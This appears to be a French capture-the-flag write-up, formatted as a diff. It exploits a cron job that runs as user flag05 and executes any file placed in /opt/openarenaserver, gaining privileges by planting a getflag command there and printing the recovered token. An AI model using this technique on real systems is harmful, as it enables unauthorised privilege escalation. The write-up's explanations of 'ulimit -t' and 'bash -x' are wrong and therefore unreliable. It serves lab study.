@@ -1,0 +1,22 @@
+Lorsqu'on se log nous pouvons voir un message nous disant You have new mail
+
+On va afficher les mails avec la commande cat /var/mail/$USER et on obtient : */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+Il s'agit d'un cron job qui s'execute toutes les deux minutes et qui execute le script present dans le fichier /usr/sbin/openarenaserver
+
+On va donc afficher le fichier /usr/sbin/openarenaserver et on obtient :
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Ce script prend tous les fichiers present dans le dossier /opt/openarenaserver et les execute. L'appel a ulimit -t 5 defini le nombre de process maximum par seconde. L'appel a bash -x execute les binaires presents dans ce dossier et enfin rm -f supprime le fichier
+
+On va donc essayer de faire executer la commande getflag par un script que nous placerons dans le dossier /opt/openarenaserver : `echo 'getflag > /tmp/result' > /opt/openarenaserver/script`
+
+On attend 2 minutes que le cron job execute le fichier /usr/sbin/openarenaserver qui executera notre script /opt/openarenaserver/script qui va creer un fichier /tmp/result avec le retour de la fonction
+
+Au bout de deux minutes on affiche le fichier /tmp/result :  cat /tmp/result
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
